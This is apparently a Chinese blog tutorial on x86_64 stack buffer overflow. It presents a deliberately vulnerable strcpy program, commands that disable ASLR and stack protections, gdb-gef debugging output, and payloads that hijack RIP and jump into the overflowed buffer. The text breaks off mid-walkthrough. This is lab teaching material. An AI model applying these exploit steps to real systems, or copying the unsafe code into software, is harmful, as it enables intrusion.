    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1-x86和x86_64的区别"><a class="markdownIt-Anchor" href="#1-x86和x86_64的区别"></a> 1. x86和x86_64的区别</h2><p>第一个主要区别就是内存地址的大小。这没啥可惊奇的: 不过即便内存地址有64位长用户空间也<strong>只能使用前47位</strong>，要牢记这点因为当你指定一个大于0x00007fffffffffff的地址时会抛出一个异常。那也就意味着0x4141414141414141会抛出异常而0x0000414141414141是安全的。当你在进行模糊测试或编写利用程序的时候我觉得这是个很巧妙的部分。</p><p>事实上还有很多其他的不同但是考虑到本文的目的不了解所有的差异也没关系。</p><h2 id="2-漏洞代码片段"><a class="markdownIt-Anchor" href="#2-漏洞代码片段"></a> 2. 漏洞代码片段</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bof.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123; </span><br><span class="line">      <span class="type">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">      <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, buffer);</span><br><span class="line">      <span class="built_in">strcpy</span>(buffer,  argv[<span class="number">1</span>]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>做实验首先要注意：<br>1.关闭ASLR，linux下ASLR是自动开启的，不关闭的话栈地址每次都是随机的（需要管理员权限）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure><p>2.编译时关闭CANARY，PIE等栈相关保护。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/overflow$ gcc bof.c -o bof -z execstack -fno-stack-protector -g</span><br></pre></td></tr></table></figure><h2 id="3-触发漏洞"><a class="markdownIt-Anchor" href="#3-触发漏洞"></a> 3. 触发漏洞</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/overflow$ ./bof $(python -c &#x27;print &quot;A&quot; * 300&#x27;)</span><br><span class="line">0x7fffffffddb0</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">段错误 (核心已转储)</span><br></pre></td></tr></table></figure><p>我们用 gdb 调试一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/overflow$ gdb-gef bof</span><br><span class="line">gef➤  disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00005555555551a9 &lt;+0&gt;:endbr64 </span><br><span class="line">   0x00005555555551ad &lt;+4&gt;:push   rbp</span><br><span class="line">   0x00005555555551ae &lt;+5&gt;:mov    rbp,rsp</span><br><span class="line">   0x00005555555551b1 &lt;+8&gt;:sub    rsp,0x110</span><br><span class="line">   0x00005555555551b8 &lt;+15&gt;:mov    DWORD PTR [rbp-0x104],edi</span><br><span class="line">   0x00005555555551be &lt;+21&gt;:mov    QWORD PTR [rbp-0x110],rsi</span><br><span class="line">   0x00005555555551c5 &lt;+28&gt;:cmp    DWORD PTR [rbp-0x104],0x2</span><br><span class="line">   0x00005555555551cc &lt;+35&gt;:je     0x5555555551d8 &lt;main+47&gt;</span><br><span class="line">   0x00005555555551ce &lt;+37&gt;:mov    edi,0x0</span><br><span class="line">   0x00005555555551d3 &lt;+42&gt;:call   0x5555555550b0 &lt;exit@plt&gt;</span><br><span class="line">   0x00005555555551d8 &lt;+47&gt;:lea    rax,[rbp-0x100]</span><br><span class="line">   0x00005555555551df &lt;+54&gt;:mov    rsi,rax</span><br><span class="line">   0x00005555555551e2 &lt;+57&gt;:lea    rdi,[rip+0xe1b]        # 0x555555556004</span><br><span class="line">   0x00005555555551e9 &lt;+64&gt;:mov    eax,0x0</span><br><span class="line">   0x00005555555551ee &lt;+69&gt;:call   0x5555555550a0 &lt;printf@plt&gt;</span><br><span class="line">   0x00005555555551f3 &lt;+74&gt;:mov    rax,QWORD PTR [rbp-0x110]</span><br><span class="line">   0x00005555555551fa &lt;+81&gt;:add    rax,0x8</span><br><span class="line">   0x00005555555551fe &lt;+85&gt;:mov    rdx,QWORD PTR [rax]</span><br><span class="line">   0x0000555555555201 &lt;+88&gt;:lea    rax,[rbp-0x100]</span><br><span class="line">   0x0000555555555208 &lt;+95&gt;:mov    rsi,rdx</span><br><span class="line">   0x000055555555520b &lt;+98&gt;:mov    rdi,rax</span><br><span class="line">   0x000055555555520e &lt;+101&gt;:call   0x555555555080 &lt;strcpy@plt&gt;</span><br><span class="line">   0x0000555555555213 &lt;+106&gt;:lea    rax,[rbp-0x100]</span><br><span class="line">   0x000055555555521a &lt;+113&gt;:mov    rdi,rax</span><br><span class="line">   0x000055555555521d &lt;+116&gt;:call   0x555555555090 &lt;puts@plt&gt;</span><br><span class="line">   0x0000555555555222 &lt;+121&gt;:mov    eax,0x0</span><br><span class="line">   0x0000555555555227 &lt;+126&gt;:leave  </span><br><span class="line">=&gt; 0x0000555555555228 &lt;+127&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">gef➤  b strcpy</span><br><span class="line">gef➤  b puts</span><br><span class="line">gef➤  r $(python -c &#x27;print &quot;A&quot; * 300&#x27;)</span><br><span class="line">Starting program: /home/sakura/文档/overflow/bof $(python -c &#x27;print &quot;A&quot; * 300&#x27;)</span><br><span class="line">0x7fffffffdd40</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Breakpoint 2, 0x00007ffff7e3a420 in puts () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x00007fffffffdd40  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x16</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdd28  →  0x0000555555555222  →  &lt;main+121&gt; mov eax, 0x0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffde40  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x00007fffffffe3c0  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAA&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdd40  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e3a420  →  &lt;puts+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0xf</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x0000555555556006  →  0x00443b031b01000a (<span class="string">&quot;\n&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x246</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x00005555555550c0  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffdf30  →  0x0000000000000002</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdd28│+0x0000: 0x0000555555555222  →  &lt;main+121&gt; mov eax, 0x0 ← $rsp</span><br><span class="line">0x00007fffffffdd30│+0x0008: 0x00007fffffffdf38  →  0x00007fffffffe289  →  0x61732f656d6f682f</span><br><span class="line">0x00007fffffffdd38│+0x0010: 0x0000000200000340</span><br><span class="line">0x00007fffffffdd40│+0x0018: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot; ← $rax, $rdi</span><br><span class="line">0x00007fffffffdd48│+0x0020: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">0x00007fffffffdd50│+0x0028: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">0x00007fffffffdd58│+0x0030: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">0x00007fffffffdd60│+0x0038: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e3a40f &lt;popen+143&gt;      jmp    0x7ffff7e3a3e4 &lt;popen+100&gt;</span><br><span class="line">   0x7ffff7e3a411                  nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x7ffff7e3a41b                  nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e3a420 &lt;puts+0&gt;         endbr64 </span><br><span class="line">   0x7ffff7e3a424 &lt;puts+4&gt;         push   r14</span><br><span class="line">   0x7ffff7e3a426 &lt;puts+6&gt;         push   r13</span><br><span class="line">   0x7ffff7e3a428 &lt;puts+8&gt;         push   r12</span><br><span class="line">   0x7ffff7e3a42a &lt;puts+10&gt;        mov    r12, rdi</span><br><span class="line">   0x7ffff7e3a42d &lt;puts+13&gt;        push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;bof&quot;</span>, stopped 0x7ffff7e3a420 <span class="keyword">in</span> puts (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e3a420 → puts()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x555555555222 → main(argc=0x2, argv=0x7fffffffdf38)</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure><p>我们发现，明明在 <code>strcpy</code> 上也下了断点，可是并未停止，不知道为什么我们 <code>r</code> 后，直接就在 <code>puts</code> 处停止了。过了 <code>strcpy</code> 调用之后你会发现当前缓冲区指针指向 <code>0x00007fffffffdd40</code> 而不是 <code>0x7fffffffddb0</code> 这是gdb的环境变量和其他东西造成的。不过现在我们不关心之后会解决的，继续向下看 si 到 <code>ret</code> 指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">gef➤  finish</span><br><span class="line">......</span><br><span class="line">gef➤  si</span><br><span class="line">0x000055555555522814&#125;</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x00007ffff7ec4077  →  0x5177fffff0003d48 (<span class="string">&quot;H=&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffde48  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x4141414141414141 (<span class="string">&quot;AAAAAAAA&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x00005555555592a0  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007ffff7fa47e0  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x0000555555555228  →  &lt;main+127&gt; ret</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x12d</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0xf</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x0000555555556006  →  0x00443b031b01000a (<span class="string">&quot;\n&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x246</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x00005555555550c0  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffdf30  →  0x0000000000000002</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [ZERO carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffde48│+0x0000: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; ← $rsp</span><br><span class="line">0x00007fffffffde50│+0x0008: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">0x00007fffffffde58│+0x0010: &quot;AAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">0x00007fffffffde60│+0x0018: &quot;AAAAAAAAAAAA&quot;</span><br><span class="line">0x00007fffffffde68│+0x0020: 0x0000550041414141 (&quot;AAAA&quot;?)</span><br><span class="line">0x00007fffffffde70│+0x0028: 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde78│+0x0030: 0x395b03b9e69a9ef5</span><br><span class="line">0x00007fffffffde80│+0x0038: 0x00005555555550c0  →  &lt;_start+0&gt; endbr64 </span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x55555555521d &lt;main+116&gt;       call   0x555555555090 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555222 &lt;main+121&gt;       mov    eax, 0x0</span><br><span class="line">   0x555555555227 &lt;main+126&gt;       leave  </span><br><span class="line"> → 0x555555555228 &lt;main+127&gt;       ret    </span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">─────────────────────────────────────────────────────────── source:bof.c+14 ────</span><br><span class="line">      9       &#125;</span><br><span class="line">     10       printf(&quot;%p\n&quot;, buffer);</span><br><span class="line">     11       strcpy(buffer,  argv[1]);</span><br><span class="line">     12       printf(&quot;%s\n&quot;, buffer);</span><br><span class="line">     13       return 0;</span><br><span class="line"> →   14 &#125;</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;bof&quot;</span>, stopped 0x555555555228 <span class="keyword">in</span> main (), reason: SINGLE STEP</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x555555555228 → main(argc=0x2, argv=0x7fffffffdf38)</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>当执行 <code>ret</code> 时，<code>rsp ---&gt; 0x4141414141414141</code>，我们没能控制 <code>RIP</code> 为什么因为我们覆盖了太多位，最大的地址是 <code>0x00007fffffffffff</code> 而我们尝试用 <code>0x4141414141414141</code> 去溢出了。</p><h2 id="4-控制rip"><a class="markdownIt-Anchor" href="#4-控制rip"></a> 4. 控制RIP</h2><p>为了解决这个问题，我们可以用个小一点的缓冲区去溢出这样指向 <code>rsp</code> 的地址就会像 <code>0x0000414141414141</code> 一样了。 通过简单的数学运算就可以很轻松地算出我们缓冲区的大小。我们知道缓冲区开始于 <code>0x00007fffffffdd40</code> 。strcpy 之后 rsp 将指向 <code>0x00007fffffffde48</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00007fffffffde48 - 0x00007fffffffdd40 = 0x108 -&gt; 十进制的264</span><br></pre></td></tr></table></figure><p>知道了这些我们可以把溢出载荷修改成这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot; * 264 + &quot;B&quot; * 6</span><br></pre></td></tr></table></figure><p>rsp指向的地址应该是 0x0000424242424242 ，那样就能控制RIP。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x00007ffff7ec4077  →  0x5177fffff0003d48 (<span class="string">&quot;H=&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffde70  →  0x00007ffff7ffc620  →  0x00050a3600000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x4141414141414141 (<span class="string">&quot;AAAAAAAA&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x00005555555592a0  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007ffff7fa47e0  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x424242424242</span>    </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x10f</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0xf</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x0000555555556006  →  0x00443b031b01000a (<span class="string">&quot;\n&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x246</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x00005555555550c0  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffdf50  →  0x0000000000000002</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [ZERO carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow RESUME virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffde70│+0x0000: 0x00007ffff7ffc620  →  0x00050a3600000000 ← $rsp</span><br><span class="line">0x00007fffffffde78│+0x0008: 0x00007fffffffdf58  →  0x00007fffffffe2a7  →  0x61732f656d6f682f</span><br><span class="line">0x00007fffffffde80│+0x0010: 0x0000000200000000</span><br><span class="line">0x00007fffffffde88│+0x0018: 0x00005555555551a9  →  &lt;main+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde90│+0x0020: 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde98│+0x0028: 0xbdf64f9ef20c1d5a</span><br><span class="line">0x00007fffffffdea0│+0x0030: 0x00005555555550c0  →  &lt;_start+0&gt; endbr64 </span><br><span class="line">0x00007fffffffdea8│+0x0038: 0x00007fffffffdf50  →  0x0000000000000002</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">[!] Cannot access memory at address 0x424242424242</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;bof&quot;</span>, stopped 0x424242424242 <span class="keyword">in</span> ?? (), reason: SIGSEGV</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>可以看到 <code>$rip : 0x424242424242</code> ，程序流程已经被我们控制了。</p><h2 id="5-跳入用户控制的缓冲区"><a class="markdownIt-Anchor" href="#5-跳入用户控制的缓冲区"></a> 5. 跳入用户控制的缓冲区</h2><p>事实上这部分内容没什么特别的或者新的东西你只需要指向你<strong>控制的缓冲区开头</strong>，也就是第一个 <code>printf</code> 显示出来的值，在这里是 <code>0x00007fffffffdd40</code>。通过 <code>gdb</code> 也可以很容易地重新获得这个值你只需在调用 <code>strcpy</code> 之后显示栈。（在上面是我们运行到断点 puts 处）</p><p>是时候更新我们的载荷了，新的载荷看起来像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1] </span><br></pre></td></tr></table></figure><p>因为是小端结构所以我们需要把内存地址反序。这就是python语句[::-1]所实现的。</p><p>确认下我们跳入正确的地址，gdb 调试程序到指令 ret 处：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 